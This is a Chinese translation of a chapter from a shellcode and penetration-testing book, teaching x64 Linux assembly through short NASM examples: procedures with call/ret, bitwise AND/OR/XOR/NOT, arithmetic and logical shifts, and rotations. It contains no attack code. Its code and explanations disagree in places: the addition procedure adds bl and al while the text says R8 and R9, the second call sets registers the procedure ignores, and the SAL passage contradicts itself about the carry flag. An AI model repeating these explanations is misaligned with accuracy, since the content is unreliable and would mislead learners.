构建过程很容易。首先，在`_start`之前定义你的过程，然后添加你的指令，并用`ret`指令结束你的过程。

让我们试着构建一个过程，可以接受两个数字并将它们相加：

```
global _start

section .text

addition:

    add bl,al
    ret

_start:

    mov al, 0x1
    mov bl, 0x3
    call addition

    mov r8,0x4
    mov r9, 0x2
    call addition

    mov rax, 60
    mov rdi, 1
    syscall

section .data
```

首先，在`_start`部分之前添加了一个`addition`部分。然后，在`addition`部分中，我们使用`add`指令来将`R8`和`R9`寄存器中的内容相加，并将结果放入`R8`寄存器，然后我们用`ret`结束了`addition`过程。

然后，我们将`1`移动到`R8`寄存器，将`3`移动到`R9`寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00095.jpeg)

然后，我们调用了`addition`过程，它将把下一条指令地址推入堆栈，即`mov r8,0x4`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00096.jpeg)

注意`RSP`现在指向下一个操作，我们在`addition`过程中，然后代码将会将两个数相加并将结果存储在`R8`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00097.jpeg)

之后，它将执行`ret`指令，这将把执行流程返回到`mov r8,0x4`。

这将把`4`移动到`R8`寄存器，然后将`2`移动到`R8`寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00098.jpeg)

然后调用`addition`过程，它将把下一条指令推入堆栈，即`mov rax, 60`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00099.jpeg)

然后，将这两个数相加并将结果存储在`R8`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00100.jpeg)

然后，我们再次执行`ret`指令，这将从堆栈中弹出下一条指令，并将其放入`RIP`寄存器中，相当于`pop rip`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00101.jpeg)

然后，代码将继续执行`exit`系统调用。

# 逻辑操作

现在，我们要讨论逻辑操作，比如位运算和位移操作。

# 位运算

在逻辑操作中有四种位运算：AND、OR、XOR 和 NOT。

让我们从 AND 位运算开始：

```
global _start

section .text

_start:

    mov rax,0x10111011
    mov rbx,0x11010110
    and rax,rbx

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

首先，我们将`0x10111011`移动到`rax`寄存器，然后将`0x11010110`移动到`rbx`寄存器：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00102.jpeg)

然后，我们对两边执行了**AND**位运算，并将结果存储在 RAX 中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00103.gif)

让我们看看`RAX`寄存器中的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00104.jpeg)

现在，让我们转到 OR 位运算，并修改之前的代码来执行这个操作：

```
global _start

section .text

_start:

    mov rax,0x10111011
    mov rbx,0x11010110
    or rax,rbx

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

我们将这两个值移动到`rax`和`rbx`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00105.jpeg)

然后，我们对这些数值执行了 OR 操作：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00106.jpeg)

现在，让我们确认一下`RAX`寄存器中的结果：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00107.jpeg)

现在让我们看看相同数值的 XOR 位运算：

```
global _start

section .text

_start:

    mov rax,0x10111011
    mov rbx,0x11010110
    xor rax,rbx

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

将相同的数值移动到`rax`和`rbx`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00108.jpeg)

然后，执行 XOR 操作：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00109.jpeg)

让我们看看`RAX`寄存器里面是什么：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00110.jpeg)

你可以使用 XOR 指令对一个寄存器自身进行操作，以清除该寄存器的内容。例如，`xor rax`和`rax`将用 0 填充 RAX 寄存器。

现在，让我们看看最后一个，即 NOT 位运算，它将把 1 变为 0，0 变为 1：

```
global _start

section .text

_start:

    mov al,0x00
    not al

    mov rax, 60
    mov rdi, 10
    syscall

section .data
```

上述代码的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00111.jpeg)

发生的事情是 NOT 指令将 0 变为 1（`ff`），1 变为 0。

# 位移操作

如果你按照每个图表所说的去做，位移操作就是一个简单的话题。主要有两种类型的位移操作：算术位移操作和逻辑操作。然而，我们也会看到旋转操作。

让我们从算术位移操作开始。

# 算术位移操作

让我们尽可能简单地解释。有两种类型的算术移位：**算术左移**（**SAL**）和**算术右移**（**SAR**）。

在 SAL 中，我们在**最低有效位**侧推送**0**，并且来自**最高有效位**侧的额外位可能会影响**CF**，如果它是**1**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00112.gif)

因此，这种移位的结果不会影响**CF**，它会是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00113.gif)

让我们举个例子：

```
global _start

section .text

_start:

    mov rax, 0x0fffffffffffffff
    sal rax, 4
    sal rax, 4

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

我们将`0x0fffffffffffffff`移动到`rax`寄存器中，现在它看起来是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00114.gif)

现在，我们要进行一次 SAL 移位 4 位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00115.gif)

因为最高有效位为零，所以 CF 不会被设置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00116.jpeg)

现在，让我们尝试另一轮：我们再推送一个零，最高有效位为 1：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00117.gif)

将设置进位标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00118.jpeg)

现在，让我们看一下 SAR 指令。在 SAR 中，如果**最高有效位**为**0**，则将推送一个基于该位的值，那么将推送**0**，如果为**1**，则将推送**1**以保持符号不变：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00119.gif)

**最高有效位**用作符号的指示，**0**表示正数，**1**表示负数。

因此，在 SAR 中，它将根据**最高有效位**进行移位。

让我们看一个例子：

```
global _start

section .text

_start:

    mov rax, 0x0fffffffffffffff
    sar rax, 4

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

因此，输入将如下所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00120.gif)

因此，SAR 四次将在最高有效位为零时推送**0**四次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00121.gif)

此外，由于最低有效位为 1，所以 CF 被设置：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00122.jpeg)

# 逻辑移位

逻辑移位还包括两种类型的移位：逻辑**左移**（**SHL**）和逻辑**右移**（**SHR**）。SHL 与 SAL 完全相同。

让我们看一下以下代码：

```
global _start

section .text

_start:

    mov rax, 0x0fffffffffffffff
    shl rax, 4
    shl rax, 4

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

同时，它将从最低有效位侧再次推送零四次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00123.gif)

这不会对进位标志产生任何影响：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00124.jpeg)

在第二轮中，它将再次推送四次零：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00125.gif)

最高有效位为 1，因此这将设置进位标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00126.jpeg)

现在让我们转向 SHR。它只是在**最高有效位**侧推送一个 0，而不改变符号：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00127.gif)

现在，尝试以下代码：

```
global _start

section .text
_start:

    mov rax, 0xffffffffffffffff
    shr rax, 32

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

因此，首先，我们移动 64 位的 1：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00128.gif)

之后，我们将进行 32 次 SHR，这将在最高有效位侧推送 32 个零：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00129.gif)

同时，由于最低有效位为 1，这将设置进位标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00130.jpeg)

# 旋转操作

旋转操作很简单：我们将寄存器的内容向右或向左旋转。在这里，我们只讨论**向右旋转**（**ROR**）和**向左旋转**（**ROL**）。

让我们从 ROR 开始：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00131.gif)

在 ROR 中，我们只是将位从右向左旋转而不添加任何位；让我们看一下以下代码：

```
global _start

section .text

_start:

    mov rax, 0xffffffff00000000
    ror rax, 32

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

我们将`0xffffffff00000000`移动到`rax`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00132.gif)

然后，我们将开始从右向左移动 32 次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00133.gif)

没有对 1 进行移位，因此不会设置进位标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00134.jpeg)

让我们移动 ROL，这是 ROR 的相反，它将位从左向右旋转而不添加任何位：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00135.gif)

让我们看一下之前的例子，但是使用 ROL：

```
global _start

section .text

_start:

    mov rax, 0xffffffff00000000
    rol rax, 32

    mov rax, 60
    mov rdi, 0
    syscall

section .data
```

首先，我们将`0xffffffff00000000`移动到`rax`寄存器中：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00136.gif)

然后，我们将从左向右旋转 32 次：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00137.gif)

我们正在旋转 1，因此这将设置进位标志：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00138.jpeg)

# 总结

在本章中，我们讨论了 Linux 中的 Intel x64 汇编语言以及如何处理堆栈、数据操作、算术和逻辑操作，如何控制执行流程，以及如何在汇编中调用系统调用。

现在我们准备制作我们自己定制的 shellcode，但在此之前，您需要学习一些调试和逆向工程的基础知识，这将是我们的下一章。
